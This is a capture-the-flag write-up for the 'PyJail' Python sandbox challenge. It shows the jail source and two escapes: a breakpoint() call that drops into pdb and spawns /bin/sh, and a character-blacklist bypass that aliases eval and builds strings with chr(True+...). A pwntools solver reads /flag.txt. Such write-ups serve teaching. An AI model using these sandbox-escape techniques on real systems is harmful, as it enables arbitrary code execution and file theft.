# PyJail [87 Solves]

## Description

> Can you break out of this python jail? 🐍
>
> P.S. flag is at /flag.txt
>
> Author: 0xM4hm0ud
>
> jail.ctf.intigriti.io 1337 || jail2.ctf.intigriti.io 1337
>
> Attachments: jail.py

<details><summary>jail.py</summary>

```python
import ast
import unicodedata

blacklist = "0123456789[]\"\'._"
check = lambda x: any(w in blacklist for w in x)

def normalize_code(code):
    return unicodedata.normalize('NFKC', code)

def execute_code(code):
    try:
        normalized_code = normalize_code(code)
        parsed = ast.parse(code)
        for node in ast.walk(parsed):
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    if node.func.id in ("os","system","eval","exec","input","open"):
                        return "Access denied!"
            elif isinstance(node, ast.Import):
                return "No imports for you!"
        if check(code):
            return "Hey, no hacking!"
        else:
            return exec(normalized_code, {}, {})
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    while True:
        user_code = input(">> ")
        if user_code.lower() == 'quit':
            break
        result = execute_code(user_code)
        print("Result:", result)
```

</details>

## Flag

INTIGRITI{Br4ak_br4ak_Br34kp01nt_ftw}

## Solution 1

This solution is based on using `breakpoint()`.

Input `breakpoint()` to start [pdb](https://docs.python.org/3/library/pdb.html) (Python Debugger), then got a shell by `import os; os.system("/bin/sh")`.

```console
root@kali:~/ctf/1337UP/Web/My_Music# nc jail.ctf.intigriti.io 1337
>> breakpoint()
--Return--
> <string>(1)<module>()->None
(Pdb) import os; os.system("/bin/sh")
/bin/sh: 0: can't access tty; job control turned off
# cat /flag.txt
INTIGRITI{Br4ak_br4ak_Br34kp01nt_ftw}#
```

## Solution 2

This is the unintended soltuion.

The input Python code is executed as `exec(normalized_code, {}, {})`, but there are some restrictions on the allowed characters (blacklist `0123456789[]"'._`) and the functions named `os`,`system`,`eval`,`exec`,`input` and `open`.

cannot do:

- `os.system("ls")` because of `.` and `"`
- `mydict['']` because of `[` and `'`
- `__class__` becasue of `_`
- `obj.method` because of `.`
- String literals with `'` and `"`

can do:

- `True`, `False`
- Operators: `+`, `-`, `%`, etc...
- variable assignment because `=` is not blacklisted.
- call global function is enable, except for the function named `os`,`system`,`eval`,`exec`,`input` and `open`. e.g. `print`, `chr`, etc...

We can assign `eval` function to a variable named `myeval` such as `myeval = eval`.
This can bypass the following restriction.

```python
                    if node.func.id in ("os","system","eval","exec","input","open"):
                        return "Access denied!"
```

Tested:

```python
>>> [node.func.id for node in ast.walk(ast.parse("""myeval=eval, myeval(1+1)""")) if isinstance(node, ast.Call) and isinstance(node.func, ast.Name)]
['myeval']
```

Also, I couldn't execute `eval("code")` because `'` and `"` is blacklisted.
However, by using that `True` is casted to `1` and `chr()`, I can create arbitrary strings.
such as `chr(True+True+...+True) + chr(True+True+...+True) + chr(True+...)`

Tested:

```python
>>> True + True
2
>>> chr(True)
'\x01'
>>> chr(True+True)
'\x02'
>>> chr(65) + chr(66)
'AB'
```

By using these, you can create Python code that prints /flag.txt to standard output and obtain the flag.

solver.py

```python
from pwn import remote

HOST = "jail.ctf.intigriti.io"
PORT = 1337

pycode = """print(open('/flag.txt').read())"""
pycode = "+".join(
    ["chr(" + "+".join(["True" for _ in range(ord(c))]) + ")" for c in pycode]
)

payload = f"myeval=eval; myeval({pycode})"

io = remote(HOST, PORT)
io.sendlineafter(b">> ", payload.encode())
io.interactive("")
```

```console
root@kali:~/ctf/1337UP/Misc/PyJail# python3 solver.py
[+] Opening connection to jail.ctf.intigriti.io on port 1337: Done
[*] Switching to interactive mode
INTIGRITI{Br4ak_br4ak_Br34kp01nt_ftw}
Result: None
>>
[*] Closed connection to jail.ctf.intigriti.io port 1337
```

## References

- [Escaping the PyJail](https://lbarman.ch/blog/pyjail/)
